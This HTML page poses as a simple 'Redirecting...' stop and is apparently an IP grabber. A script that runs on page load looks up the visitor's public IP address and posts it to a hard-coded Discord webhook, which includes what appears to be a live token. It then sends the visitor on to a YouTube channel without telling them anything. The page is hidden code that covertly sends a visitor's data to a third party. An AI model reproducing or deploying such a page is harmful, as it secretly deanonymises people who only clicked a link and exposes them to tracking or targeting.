<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <style>
        body {
            background-color: white;
            margin: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
    </style>
    <script>
        async function sendIPToWebhook() {
            try {
                // Fetch IP address
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                const ip = data.ip;

                // Prepare webhook payload
                const payload = {
                    content: `IP Address: ${ip}`
                };

                // Send IP to Discord webhook
                await fetch('https://discord.com/api/webhooks/1254076950691975238/MyvO0e3eNpjpZ0rw3nLPkFFOFVGuaRzvgjXMQMlK5DiUIm3GmGsH_PIdgePEphl8_I5-', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                });

                // Redirect to YouTube
                window.location.href = 'https://youtube.com/@limberwholimberme?si=PtjQz4LfGk-tOyqr';
            } catch (error) {
                console.error('Error sending IP to webhook:', error);
            }
        }

        window.onload = sendIPToWebhook;
    </script>
</head>
<body>
</body>
</html>
